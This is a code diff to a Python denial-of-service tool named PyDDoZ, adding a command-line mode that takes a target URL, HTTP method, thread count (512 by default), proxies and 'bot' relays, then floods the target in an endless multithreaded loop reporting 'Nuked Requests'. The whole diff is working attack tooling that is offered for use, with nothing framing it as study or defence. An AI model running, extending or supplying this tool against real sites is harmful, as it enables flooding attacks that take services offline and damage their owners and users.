@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 
+import argparse
 import logging
 import json
 import proxify
@@ -12,9 +13,9 @@ import time
 import threading
 import urllib3
 from colorama import Fore, Back
+from logging.handlers import RotatingFileHandler
 from fake_useragent import UserAgent
 from time import sleep
-from logging.handlers import RotatingFileHandler
 
 
 def show_banner():
@@ -158,6 +159,70 @@ def send_request():
     return
 
 
+def arg_parsing():
+
+    parser = argparse.ArgumentParser(
+        description='PyDDoZ Argument Parser v1.0.0')
+    parser.add_argument('-u', help='URL', required=True, type=str)
+    parser.add_argument(
+        '-m',
+        help='GET, POST, PUT, HEAD, OPTIONS, DELETE? [G/P/U/H/O/D]',
+        default='g',
+        choices=[
+            'g',
+            'p',
+            'u',
+            'h',
+            'o',
+            'd'])
+    parser.add_argument('-d', help='Post or Put Data', default='', type=str)
+    parser.add_argument(
+        '-r',
+        help='Randomize Data',
+        default='n',
+        choices=[
+            'y',
+            'n'])
+    parser.add_argument(
+        '-mr',
+        help='Max Random Character',
+        default='10',
+        type=int)
+    parser.add_argument(
+        '-b',
+        help='Activate Bots',
+        default='n',
+        choices=[
+            'y',
+            'n'])
+    parser.add_argument(
+        '-ob',
+        help='Only Bots',
+        default='n',
+        choices=[
+            'y',
+            'n'])
+    parser.add_argument('-t', help='Timeout', default=30, type=int)
+    parser.add_argument('-th', help='Threads', default=512, type=int)
+    parser.add_argument(
+        '-s',
+        help='Sleep Time Between Threads',
+        default=0,
+        type=int)
+    parser.add_argument('-re', help='Retries', default=3, type=int)
+    parser.add_argument('-p', help='Proxy', default='n', choices=['y', 'n'])
+    parser.add_argument(
+        '-rd',
+        help='Redirection',
+        default='n',
+        choices=[
+            'y',
+            'n'])
+    args = parser.parse_args()
+
+    return args
+
+
 if __name__ == '__main__':
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     resource.setrlimit(resource.RLIMIT_NOFILE, (999999, 999999))
@@ -168,20 +233,21 @@ if __name__ == '__main__':
         filemode='w',
         level=logging.DEBUG)
     log = logging.getLogger()
-    handler = RotatingFileHandler('pyddoz.log', maxBytes=10*1024*1024, backupCount=3)
+    handler = RotatingFileHandler(
+        'pyddoz.log',
+        maxBytes=10 * 1024 * 1024,
+        backupCount=3)
     log.addHandler(handler)
     show_banner()
-
     logging.info('Program started!')
     print(Back.RESET + Fore.BLUE + '\nProgram is preparing...', end='')
+    print('\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b', end='')
 
     try:
         ua = UserAgent()
 
     except BaseException:
         ua = UserAgent(use_cache_server=False)
-
-    print(Fore.BLUE + '\rProgram was started successfully!')
 
     num_failed = 0
     num_success = 0
@@ -191,6 +257,81 @@ if __name__ == '__main__':
     bot_urls.append('https://gtmetrix.com/analyze.html')
     urls = []
     randomize_data = 'n'
+    interactive_mode = False
+
+    try:
+        if (not (len(sys.argv) > 1)):
+            interactive_mode = True
+            raise Exception('Interactive Shell Mode')
+        else:
+            arguments = arg_parsing()
+
+        if ((arguments is not False) and (arguments.u)):
+
+            urls = [arguments.u]
+            selected_method = arguments.m
+            payload = arguments.d
+            randomize_data = arguments.r
+            max_random = arguments.mr
+            activate_bots = arguments.b
+            only_bots = arguments.ob
+            selected_to = arguments.t
+            num_threads = arguments.th
+            sleep_time = arguments.s
+            num_retries = arguments.re
+            use_proxy = arguments.p
+            selected_redir = arguments.rd
+
+            start_time = time.time()
+            print(Fore.BLUE + '\rProgram was started successfully!')
+            print(Fore.RED + 'Attack is started! Press [CTRL + C] to stop.')
+            logging.info('Attack started!')
+
+            while (True):
+                try:
+                    for i in range(num_threads):
+                        t = threading.Thread(target=send_request)
+                        t.start()
+                        sleep(sleep_time)
+                        elapsed_time = time.time() - start_time
+                        print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
+
+                    main_thread = threading.currentThread()
+                    for i in threading.enumerate():
+                        if i is main_thread:
+                            continue
+                        else:
+                            print(Fore.BLUE + 'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(str(num_success), str(num_failed), str(num_bot_requests), round(elapsed_time)), end='\r', flush=True)
+                            i.join()
+
+                except KeyboardInterrupt:
+                    print(Fore.RED + '\nAttack was stopped!')
+                    logging.info('Attack stopped!')
+                    main_thread = threading.currentThread()
+                    print(Fore.RED + 'Threads are exiting...')
+
+                    for i in threading.enumerate():
+                        if i is main_thread:
+                            continue
+                        else:
+                            i.join()
+
+                    logging.info(
+                        'Responded Requests: {0} - Nuked Requests: {1} - Bot Requests: {2} - Elapsed Time: {3} seconds.'.format(
+                            str(num_success),
+                            str(num_failed),
+                            str(num_bot_requests),
+                            round(elapsed_time)))
+                    print(Fore.BLUE + 'Successfully finished!')
+                    logging.info('Successfully finished!')
+                    sys.exit()
+
+    except BaseException as arg_error:
+        logging.critical('Argument mode was stopped! ' + str(arg_error))
+        if (not interactive_mode):
+            sys.exit()
+
+    print(Fore.BLUE + '\rProgram was started successfully!')
 
     while (True):
         try:
